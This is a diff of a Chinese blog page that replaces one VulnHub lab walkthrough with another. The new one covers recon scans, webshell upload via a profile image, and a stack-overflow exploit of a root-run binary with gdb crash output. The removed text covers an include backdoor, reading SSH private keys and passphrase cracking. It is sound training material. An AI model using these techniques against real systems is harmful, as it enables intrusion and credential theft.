@@ -5,14 +5,11 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="baidu-site-verification" content="codeva-saNLerbgqp" />
-    <meta name="keywords" content="vulhub6, 清风的博客">
-    <meta name="description" content="vulhub6靶机地址：
-准备工作可以先安装kali的字典:
-sudo apt install seclists
-
-或者直接输入seclists​，系统会问你是否安装，输入y即可自动安装
-​
-默认路径就是在/usr/share/wordli">
+    <meta name="keywords" content="vulnhub5, 清风的博客">
+    <meta name="description" content="vulhub5靶机下载地址：
+https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova
+信息收集第一步信息收集，还是老方法我习惯fscan和nmap一起用
+Fscan简单探测">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +21,7 @@ sudo apt install seclists
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>vulhub6 | 清风的博客</title>
+    <title>vulnhub5 | 清风的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -297,12 +294,12 @@ sudo apt install seclists
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">vulhub6</h1>
+                    <h1 class="description center-align post-title">vulnhub5</h1>
                 </div>
             </div>
         </div>
@@ -334,8 +331,8 @@ sudo apt install seclists
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/" class="post-category">
-                                未分类
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                靶机
                             </a>
                         
                     </div>
@@ -347,21 +344,21 @@ sudo apt install seclists
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-10-09
+                    2023-10-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-10-09
+                    2023-10-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.6k
                 </div>
                 
 
@@ -388,55 +385,12 @@ sudo apt install seclists
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="vulhub6"><a href="#vulhub6" class="headerlink" title="vulhub6"></a>vulhub6</h1><p>靶机地址：</p>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>可以先安装kali的字典:</p>
-<pre class=" language-shell"><code class="language-shell">sudo apt install seclists
-</code></pre>
-<p>或者直接输入<code>seclists</code>​，系统会问你是否安装，输入y即可自动安装</p>
-<p><img src="/Blogimages/vulhub6/image-20231008155601-da9pa2r.png" alt="image">​</p>
-<p>默认路径就是在<code>/usr/share/wordlists</code>​里面各类的字典非常多</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231008155728-fenv3bw.png" alt="image"></p>
-<p>​<code>gobuster</code>​的安装同理</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap探测端口开放信息</p>
+                <h1 id="vulhub5"><a href="#vulhub5" class="headerlink" title="vulhub5"></a>vulhub5</h1><p>靶机下载地址：</p>
+<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova">https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>第一步信息收集，还是老方法我习惯fscan和nmap一起用</p>
+<p>Fscan简单探测全局信息</p>
 <pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/Tools/fscan<span class="token punctuation">]</span>
-└─$ <span class="token function">sudo</span> nmap --min-rate 10000 -p- 192.168.142.129
-<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
-Starting Nmap 7.94 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-10-08 11:12 CST
-Nmap scan report <span class="token keyword">for</span> 192.168.142.129
-Host is up <span class="token punctuation">(</span>0.00052s latency<span class="token punctuation">)</span>.
-Not shown: 65533 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
-PORT   STATE SERVICE
-22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
-80/tcp <span class="token function">open</span>  http
-MAC Address: 00:0C:29:B5:81:B9 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
-
-Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 2.20 seconds
-</code></pre>
-<p>nmap探测开放端口的详细信息以及操作系统等信息</p>
-<pre class=" language-shell"><code class="language-shell">┌──(kali㉿kali)-[~/Desktop/Tools/fscan]
-└─$ sudo nmap -sV -sT -O -p 22,80 192.168.142.129 
-Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 11:12 CST
-Nmap scan report for 192.168.142.129
-Host is up (0.00022s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.38 ((Debian))
-MAC Address: 00:0C:29:B5:81:B9 (VMware)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.8
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 7.78 seconds
-</code></pre>
-<p>fscan扫描</p>
-<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/Tools/fscan<span class="token punctuation">]</span>
-└─$ ./fscan_amd64 -h 192.168.142.129
+└─$ ./fscan_amd64 -h 192.168.120.141
 
    ___                              _  
   / _ \     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ 
@@ -448,155 +402,216 @@ start infoscan
 trying RunIcmp2
 The current user permissions unable to send icmp packets
 start <span class="token function">ping</span>
-<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target 192.168.142.129 is alive
+<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target 192.168.120.141 is alive
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: 1
-192.168.142.129:22 <span class="token function">open</span>
-192.168.142.129:80 <span class="token function">open</span>
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: 2
+192.168.120.141:22 <span class="token function">open</span>
+192.168.120.141:80 <span class="token function">open</span>
+192.168.120.141:8000 <span class="token function">open</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: 3
 start vulscan
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://192.168.142.129    code:200 len:10701  title:Apache2 Debian Default Page: It works
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://192.168.120.141:8000 code:501 len:216    title:Error response
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://192.168.120.141    code:200 len:10609  title:Social Network
 </code></pre>
-<p>只有一个80是可利用的，所以就直接访问扫目录了</p>
-<pre class=" language-shell"><code class="language-shell">┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]
-└─$ gobuster dir -u http://192.168.142.129/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,asp,jsp,html
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.142.129/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              php,txt,asp,jsp,html
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/.php                 (Status: 403) [Size: 280]
-/.html                (Status: 403) [Size: 280]
-/index.html           (Status: 200) [Size: 10701]
-/robots.txt           (Status: 200) [Size: 12]
-/secret               (Status: 301) [Size: 319] [--> http://192.168.142.129/secret/]                                                        
-/.php                 (Status: 403) [Size: 280]
-/.html                (Status: 403) [Size: 280]
-/server-status        (Status: 403) [Size: 280]
-Progress: 1323360 / 1323366 (100.00%)
-===============================================================
-Finished
-===============================================================
+<p>nmap扫描全端口</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/Tools/fscan<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> nmap --min-rate 10000 -p- 192.168.120.141
+Starting Nmap 7.94 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-10-01 19:15 CST
+Nmap scan report <span class="token keyword">for</span> 192.168.120.141
+Host is up <span class="token punctuation">(</span>0.000033s latency<span class="token punctuation">)</span>.
+Not shown: 65532 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT     STATE SERVICE
+22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
+80/tcp   <span class="token function">open</span>  http
+8000/tcp <span class="token function">open</span>  http-alt
+MAC Address: 00:0C:29:F4:0E:58 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 7.00 seconds
 </code></pre>
-<p>扫出来三个</p>
-<pre class=" language-xml"><code class="language-xml">/index.html           (Status: 200) [Size: 10701]
-/robots.txt           (Status: 200) [Size: 12]
-/secret               (Status: 301) [Size: 319] [--> http://192.168.142.129/secret/]  
+<p>nmap扫描开放端口和操作系统的信息</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/Tools/fscan<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> nmap -sT -sV -O -p 22,80,8000 192.168.120.141
+Starting Nmap 7.94 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-10-01 19:16 CST
+Stats: 0:00:09 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing Service Scan
+Service scan Timing: About 33.33% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 19:16 <span class="token punctuation">(</span>0:00:12 remaining<span class="token punctuation">)</span>
+Nmap scan report <span class="token keyword">for</span> 192.168.120.141
+Host is up <span class="token punctuation">(</span>0.00013s latency<span class="token punctuation">)</span>.
+
+PORT     STATE SERVICE VERSION
+22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.6p1 Ubuntu 4 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>
+80/tcp   <span class="token function">open</span>  http    Apache httpd 2.4.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+8000/tcp <span class="token function">open</span>  http    BaseHTTPServer 0.3 <span class="token punctuation">(</span>Python 2.7.15rc1<span class="token punctuation">)</span>
+MAC Address: 00:0C:29:F4:0E:58 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least 1 <span class="token function">open</span> and 1 closed port
+Device type: general purpose
+Running: Linux 3.X<span class="token operator">|</span>4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 10.57 seconds
 </code></pre>
-<p>index.html是默认页面</p>
-<p>robots.txt的内容：</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231008163858-67tqu0w.png" alt="image">​</p>
-<p>可以先记录，万一是后面需要用到的用户名或者密码</p>
-<p>接下来就是二层目录爆破&#x2F;secret了</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009075242-r4qxzq9.png" alt="image">​</p>
-<p>扫出一个evil.php，像是后门文件，没有回显，需要爆破参数</p>
-<p>还得猜一下后门类型（eval,system,include）</p>
-<h4 id="eval参数爆破"><a href="#eval参数爆破" class="headerlink" title="eval参数爆破"></a>eval参数爆破</h4><p>​<img src="/Blogimages/vulhub6/image-20231009080331-lfaklad.png" alt="image">​</p>
-<p>无结果</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009080410-zmnjstp.png" alt="image">​</p>
-<h4 id="system参数爆破"><a href="#system参数爆破" class="headerlink" title="system参数爆破"></a>system参数爆破</h4><p>​<img src="/Blogimages/vulhub6/image-20231009080542-kvbm7p3.png" alt="image">​</p>
-<p>无结果</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009080529-gr4efvw.png" alt="image">​</p>
-<p>‍</p>
-<h4 id="include参数爆破"><a href="#include参数爆破" class="headerlink" title="include参数爆破"></a>include参数爆破</h4><p>​<img src="/Blogimages/vulhub6/image-20231009080647-ganm5o6.png" alt="image">​</p>
-<p>成功爆破出command</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009080636-wkxc334.png" alt="image">​</p>
-<p>任意文件读取思路：</p>
-<pre class=" language-xml"><code class="language-xml">1.可以读取/etc/passwd或者知道用户名的前提下，可以看用户目录的历史命令
-2.可以看一下/root/.ssh/id_rsa或者/home/user/.ssh/id_rsa查看私钥 公钥文件`authorized_keys`
-3.使用php伪协议写文件：
-* 写文件：php://filter/write.base64-decode/resource=文件名&amp;txt=写入内容的base64编码
-* 如果写入成功的话可以直接查看，否则不成功
-4日志包含getshell.
-5.filterchains php gen
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>开放了两个web服务一个是apache2的，还有一个是python的</p>
+<p>这里正常思路就是先访问web服务了，首先是80端口的服务</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193314-369e8m0.png" alt="image">​</p>
+<p>是一个用户登录注册的地方，因为这里没有admin的邮箱地址，所以我们只能尝试使用注册来看看登录后的系统是否存在漏洞</p>
+<p>首先我们注册账号：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193427-j0jitom.png" alt="image">​</p>
+<p>登录后简单测一下漏洞：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193512-jkb10rz.png" alt="image">​</p>
+<p>发现有xss（但是没啥用）</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193529-1tqhdoi.png" alt="image">​</p>
+<p>测试其他漏洞：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193612-qcubocw.png" alt="image">​</p>
+<p>发现了文件上传，这里可以简单测试一下：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193747-fpl8dkx.png" alt="image">​</p>
+<p>传个马，似乎成功了，试一下连接：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193934-h1yn5f0.png" alt="image">​</p>
+<p>找到地址:<code>http://192.168.120.141/data/images/profiles/3.php</code>​</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001193958-up1x7ab.png" alt="image">​</p>
+<p>可以成功连接</p>
+<h2 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升 1"></a>权限提升 1</h2><p>提权：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231001194609-ptarw8c.png" alt="image">​</p>
+<p>发现这个cve依旧可以。。。</p>
+<h2 id="权限提升-2"><a href="#权限提升-2" class="headerlink" title="权限提升 2"></a>权限提升 2</h2><p>但是这里的预期解似乎不是这个,预期解需要Pwn</p>
+<p>现学Pwn咯</p>
+<p>我们getshell之后可以在&#x2F;home&#x2F;user目录看到</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231004151147-r09nawk.png" alt="image">​</p>
+<p>一个root权限启动的服务</p>
+<p>我们下载到<code>Kali</code>​用<code>pwngdb</code>​调试他(未安装可以安装一下：<a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">pwndbg&#x2F;pwndbg: Exploit Development and Reverse Engineering with GDB Made Easy (github.com)</a>)</p>
+<p>先用checksec看一下开启的保护：</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─$ checksec add_record 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/kali/Desktop/add_record'</span>
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+    Stack:    Executable
+    RWX:      Has RWX segments
 </code></pre>
-<p>使用如下命令查看ssh登录的相关信息：</p>
-<pre class=" language-xml"><code class="language-xml">┌──(kali㉿kali)-[~/Desktop]
-└─$ ssh mowree@192.168.142.129 -v
+<p>除了一个Stack，其他全关</p>
+<p>启动一下Pwngdb：</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment" spellcheck="true"># gdb -q add_record</span>
+pwndbg: loaded 147 pwndbg commands and 47 shell commands. Type pwndbg <span class="token punctuation">[</span>--shell <span class="token operator">|</span> --all<span class="token punctuation">]</span> <span class="token punctuation">[</span>filter<span class="token punctuation">]</span> <span class="token keyword">for</span> a list.                                
+pwndbg: created <span class="token variable">$rebase</span>, <span class="token variable">$ida</span> GDB functions <span class="token punctuation">(</span>can be used with print/break<span class="token punctuation">)</span>                                                                  
+Reading symbols from add_record<span class="token punctuation">..</span>.
+<span class="token punctuation">(</span>No debugging symbols found <span class="token keyword">in</span> add_record<span class="token punctuation">)</span>
+------- tip of the day <span class="token punctuation">(</span>disable with <span class="token keyword">set</span> show-tips off<span class="token punctuation">)</span> -------
+Pwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with <span class="token keyword">set</span> emulate off <span class="token function">which</span> may also speed up debugging                            
+pwndbg<span class="token operator">></span> 
 </code></pre>
-<p>​<img src="/Blogimages/vulhub6/image-20231009081450-3g4gh01.png" alt="image">​</p>
-<p>发现允许公钥和密码登入，发现只有第二种方法是行得通的</p>
-<p>ssh中密钥和公钥的配置文件路径：</p>
-<pre class=" language-xml"><code class="language-xml">公钥： .ssh/authorized_keys
-私钥： .ssh/id_rsa
+<p>我们先测试哪里存在栈溢出（因为只会栈溢出）</p>
+<p>先准备好多个A用于测试栈溢出：</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─$ python -c <span class="token string">"print('A'*1000)"</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </code></pre>
-<p>这里有两种思路去读取：</p>
-<p>1.读取root的，直接抵达目的（大多情况下权限不够）</p>
-<p>2.直接读取用户的配置文件，一般下权限都是足够的</p>
-<p>这里只能读取用户的，私钥：</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009082008-9fbtxhp.png" alt="image">​</p>
-<p>公钥：</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009082023-eeehhlg.png" alt="image"></p>
-<p>写入自己的ssh文件，然后</p>
-<p>但是这里无法直接拿着密钥去登录ssh还是需要密码，有两种可能：</p>
-<pre class=" language-xml"><code class="language-xml">1.服务器未开启私钥登录的配置
-2.在设置私钥的时候配置了私钥的密码（passphrase）所以在登录的时候还是需要输入密码
+<p>用r执行让程序跑起来：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231004154822-qm78gpy.png" alt="image">​</p>
+<p>输入后发现程序异常直接退出，判断这里不存在栈溢出，接着下一个点测试：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231004154858-t3r3kw3.png" alt="image">​</p>
+<p>同样正常退出，接着往下测试，直到最后一个explain：</p>
+<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> r
+Starting program: /home/kali/Desktop/add_record 
+<span class="token punctuation">[</span>Thread debugging using libthread_db enabled<span class="token punctuation">]</span>
+Using host libthread_db library <span class="token string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="token keyword">.</span>                                                                  
+Welcome to Add Record application
+Use it to add info about Social Network 2.0 Employees
+Employee Name<span class="token punctuation">(</span>char<span class="token punctuation">)</span>: a
+Years worked<span class="token punctuation">(</span>int<span class="token punctuation">)</span>: 1
+Salary<span class="token punctuation">(</span>int<span class="token punctuation">)</span>: 1
+Ever got <span class="token keyword">in</span> trouble? 1 <span class="token punctuation">(</span>yes<span class="token punctuation">)</span> or 0 <span class="token punctuation">(</span>no<span class="token punctuation">)</span>: 1
+Explain: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
+LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
+────────<span class="token punctuation">[</span> REGISTERS / show-flags off / show-compact-regs off <span class="token punctuation">]</span>─────────
+*EAX  0xffffd27e ◂— 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+*EBX  0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+*ECX  0xffffd6c0 ◂— <span class="token string">'AAAA'</span>
+*EDX  0xffffd662 ◂— <span class="token string">'AAAA'</span>
+*EDI  0xffffd340 ◂— 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+*ESI  0x80488d0 <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push ebp
+*EBP  0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+*ESP  0xffffd2c0 ◂— 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+*EIP  0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+──────────────────<span class="token punctuation">[</span> DISASM / i386 / <span class="token keyword">set</span> emulate on <span class="token punctuation">]</span>───────────────────
+Invalid address 0x41414141
+
+
+
+
+
+
+
+
+
+
+───────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>───────────────────────────────
+00:0000│ esp 0xffffd2c0 ◂— 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
+<span class="token punctuation">..</span>. ↓        7 skipped
+─────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>─────────────────────────────
+ ► 0 0x41414141
+   1 0x41414141
+   2 0x41414141
+   3 0x41414141
+   4 0x41414141
+   5 0x41414141
+   6 0x41414141
+   7 0x41414141
+───────────────────────────────────────────────────────────────────────
 </code></pre>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>所以下一步就是需要爆破设置的密钥是配置了什么密码，利用kali自带的john工具</p>
-<p>但是这个工具对爆破的内容格式要求比较严格，我们需要使用脚本把格式弄成我们需要的格式，脚本文件位置：<code>/usr/share/john/ssh2john.py</code>​</p>
-<p>​<img src="/Blogimages/vulhub6/image-20231009082823-cwemdpy.png" alt="image">​</p>
-<p>利用此脚本:</p>
-<pre class=" language-shell"><code class="language-shell">python ssh2john.py /root/.ssh/id_rsa > /root/.ssh/hash
+<p>这里发现可以覆盖掉栈的地址，说明我们这里是可能存在漏洞的</p>
+<p>如何利用呢？</p>
+<p>利用IDA打开这个程序可以发现</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231004155054-sqwwo71.png" alt="image">​</p>
+<p>这个程序是存在<code>backdoor</code>​的，直接返回一个<code>system(&#39;/bin/sh&#39;)</code>​</p>
+<p>所以只要覆盖掉<code>EIP</code>​的地址为<code>backdoor</code>​函数的地址即可执行backdoor返回一个<code>/bin/sh</code>​</p>
+<p>下一步工作就是测试哪个位置可以覆盖EIP，因为我们输入的1000个A中不知道具体是哪几个站住了EIP的地址</p>
+<p>只知道确实是可以覆盖的：</p>
+<p>​<img src="/Blogimages/vulhub5/image-20231004155315-gunj1d4.png" alt="image">​</p>
+<p>所以我们利用MSF生成的随机字符串来定位：</p>
